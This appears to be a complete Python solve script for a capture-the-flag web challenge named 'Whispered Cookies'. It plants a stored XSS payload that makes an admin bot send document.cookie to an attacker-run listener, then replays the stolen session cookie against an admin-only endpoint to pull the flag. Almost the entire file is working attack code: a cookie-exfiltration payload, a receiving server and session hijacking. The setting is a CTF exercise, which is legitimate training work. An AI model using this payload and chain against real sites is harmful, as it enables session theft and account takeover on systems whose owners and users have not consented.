#!/usr/bin/env python3
"""
Whispered Cookies (port 8081) — full solve script.

Chain: stored XSS in message body -> admin "handler" bot leaks its session
cookie -> replay cookie against the admin-only /classified endpoint -> flag.

Run from a host reachable by the target's bot (attacker IP must be on the
same network as the challenge box). Only stdlib is used.
"""
import http.server, socketserver, threading, re, sys, time
import urllib.request, urllib.parse

TARGET   = "http://192.168.45.128:8081"   # challenge box
ATTACKER = "192.168.45.1"                 # this host, as seen by the box
PORT     = 8000

leaked = {}

class Listener(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Bot leaks the cookie as an extra "&c=<cookie>" query param.
        m = re.search(r"[?&]c=([^&]+)", urllib.parse.unquote(self.path))
        if m and "nexus_session" in m.group(1):
            leaked["cookie"] = m.group(1)
        self.send_response(200); self.end_headers()
    def log_message(self, *a):
        pass

def main():
    srv = socketserver.TCPServer(("0.0.0.0", PORT), Listener)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    # 1) Stored XSS: the bot substitutes its real cookie into this URL.
    payload = ("<script>new Image().src='http://%s:%d/x?'+document.cookie</script>"
               % (ATTACKER, PORT))
    data = urllib.parse.urlencode({"username": "agent", "message": payload}).encode()
    urllib.request.urlopen(TARGET + "/post", data=data)

    # 2) Wait for the handler bot to visit and leak the cookie.
    print("[*] waiting for handler bot...", flush=True)
    for _ in range(120):
        if "cookie" in leaked:
            break
        time.sleep(1)
    assert "cookie" in leaked, "bot never visited (check ATTACKER IP / connectivity)"
    cookie = leaked["cookie"]
    print("[+] leaked cookie:", cookie, flush=True)

    # 3) Replay the privileged cookie against the admin endpoint.
    req = urllib.request.Request(TARGET + "/classified",
                                 headers={"Cookie": cookie})
    html = urllib.request.urlopen(req).read().decode()
    flag = re.search(r"MAHASONA\{[^}]+\}", html).group(0)
    print("[+] FLAG:", flag, flush=True)

if __name__ == "__main__":
    main()
